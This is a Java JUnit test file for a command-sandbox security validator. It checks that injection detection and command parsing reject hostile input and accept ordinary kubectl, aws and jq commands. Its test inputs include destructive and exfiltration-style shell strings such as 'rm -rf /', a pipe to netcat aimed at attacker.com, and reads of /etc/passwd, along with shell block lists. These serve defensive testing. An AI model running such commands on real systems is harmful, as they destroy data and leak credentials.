package io.camunda.connector.sandbox.security;

import io.camunda.connector.sandbox.model.ParsedCommand;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.assertj.core.api.Assertions.assertThatCode;

/**
 * Tests for SecurityValidator focusing on the InjectionDetector and CommandParser components.
 * These tests verify the core security validation logic without Spring context.
 */
@DisplayName("Security Validation")
class SecurityValidatorTest {

    private InjectionDetector injectionDetector;
    private CommandParser commandParser;

    @BeforeEach
    void setUp() {
        injectionDetector = new InjectionDetector();
        commandParser = new CommandParser();
    }

    @Nested
    @DisplayName("Command injection detection")
    class CommandInjectionDetection {

        @Test
        @DisplayName("should reject command with semicolon")
        void shouldRejectSemicolon() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("kubectl; rm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Semicolons");
        }

        @Test
        @DisplayName("should reject command with pipe")
        void shouldRejectPipe() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("kubectl | nc attacker.com"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Pipe");
        }

        @Test
        @DisplayName("should reject command substitution")
        void shouldRejectCommandSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("kubectl $(cat /etc/passwd)"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Command substitution");
        }

        @Test
        @DisplayName("should reject backtick substitution")
        void shouldRejectBacktickSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("kubectl `whoami`"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Backticks");
        }

        @Test
        @DisplayName("should reject redirect operators")
        void shouldRejectRedirectOperators() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo data > /etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("redirection");
        }

        @Test
        @DisplayName("should reject variable expansion")
        void shouldRejectVariableExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo $HOME"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Environment variable");
        }
    }

    @Nested
    @DisplayName("Safe command parsing")
    class SafeCommandParsing {

        @Test
        @DisplayName("should parse simple command")
        void shouldParseSimpleCommand() {
            ParsedCommand result = commandParser.parse("kubectl get pods");
            
            assertThat(result.getExecutable()).isEqualTo("kubectl");
            assertThat(result.getArguments()).containsExactly("get", "pods");
        }

        @Test
        @DisplayName("should parse command with quoted arguments")
        void shouldParseQuotedArguments() {
            ParsedCommand result = commandParser.parse("jq '.items[]'");
            
            assertThat(result.getExecutable()).isEqualTo("jq");
            assertThat(result.getArguments()).containsExactly(".items[]");
        }

        @Test
        @DisplayName("should parse command with flags")
        void shouldParseCommandWithFlags() {
            ParsedCommand result = commandParser.parse("kubectl get pods -n default --output=json");
            
            assertThat(result.getExecutable()).isEqualTo("kubectl");
            assertThat(result.getArguments()).containsExactly("get", "pods", "-n", "default", "--output=json");
        }
    }

    @Nested
    @DisplayName("Shell executable blocking")
    class ShellExecutableBlocking {

        @ParameterizedTest
        @ValueSource(strings = {"sh", "bash", "zsh", "csh", "tcsh", "ksh", "fish", "dash", "ash"})
        @DisplayName("should reject shell executables: {0}")
        void shouldRejectShellExecutables(String shell) {
            assertThatThrownBy(() -> commandParser.parse(shell + " -c 'echo hello'"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("shell invocation");
        }

        @ParameterizedTest
        @ValueSource(strings = {"eval", "exec", "source"})
        @DisplayName("should reject command execution utilities: {0}")
        void shouldRejectCommandExecutionUtilities(String cmd) {
            assertThatThrownBy(() -> commandParser.parse(cmd + " something"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("not allowed");
        }
    }

    @Nested
    @DisplayName("Path validation")
    class PathValidation {

        @Test
        @DisplayName("should reject absolute path executables")
        void shouldRejectAbsolutePath() {
            assertThatThrownBy(() -> commandParser.parse("/bin/ls"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("paths are not allowed");
        }

        @Test
        @DisplayName("should reject relative path executables")
        void shouldRejectRelativePath() {
            assertThatThrownBy(() -> commandParser.parse("./malicious"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("paths are not allowed");
        }

        @Test
        @DisplayName("should detect path traversal attempts")
        void shouldDetectPathTraversal() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("../../../etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Path traversal");
        }

        @Test
        @DisplayName("should detect system path access")
        void shouldDetectSystemPathAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("/etc/");
        }
    }

    @Nested
    @DisplayName("Valid tool commands")
    class ValidToolCommands {

        @ParameterizedTest
        @ValueSource(strings = {
                "kubectl get pods",
                "aws s3 ls",
                "gcloud compute instances list",
                "terraform plan",
                "helm list",
                "jq '.items[]'",
                "yq '.metadata.name'",
                "curl --version"
        })
        @DisplayName("should accept valid tool command: {0}")
        void shouldAcceptValidToolCommand(String command) {
            assertThatCode(() -> {
                injectionDetector.detectInjection(command);
                commandParser.parse(command);
            }).doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Dangerous patterns")
    class DangerousPatterns {

        @Test
        @DisplayName("should detect rm -rf")
        void shouldDetectRmRf() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("rm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("rm -rf");
        }

        @Test
        @DisplayName("should detect sudo")
        void shouldDetectSudo() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("sudo rm something"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("sudo");
        }

        @Test
        @DisplayName("should detect chmod")
        void shouldDetectChmod() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("chmod 777 file"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("chmod");
        }

        @Test
        @DisplayName("should detect netcat")
        void shouldDetectNetcat() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("nc -l 4444"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("netcat");
        }
    }

    @Nested
    @DisplayName("Input validation")
    class InputValidation {

        @Test
        @DisplayName("should reject excessively long input")
        void shouldRejectLongInput() {
            String longInput = "a".repeat(10001);
            
            assertThatThrownBy(() -> injectionDetector.detectInjection(longInput))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("too long");
        }

        @Test
        @DisplayName("should reject control characters")
        void shouldRejectControlCharacters() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\u0007bell"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }

        @Test
        @DisplayName("should allow tab character")
        void shouldAllowTab() {
            assertThatCode(() -> injectionDetector.detectInjection("arg1\targ2"))
                    .doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Empty input handling")
    class EmptyInputHandling {

        @Test
        @DisplayName("should accept null injection check")
        void shouldAcceptNullInjectionCheck() {
            assertThatCode(() -> injectionDetector.detectInjection(null))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("should accept empty injection check")
        void shouldAcceptEmptyInjectionCheck() {
            assertThatCode(() -> injectionDetector.detectInjection(""))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("should reject null command parse")
        void shouldRejectNullCommandParse() {
            assertThatThrownBy(() -> commandParser.parse(null))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("empty");
        }

        @Test
        @DisplayName("should reject empty command parse")
        void shouldRejectEmptyCommandParse() {
            assertThatThrownBy(() -> commandParser.parse(""))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("empty");
        }
    }
}
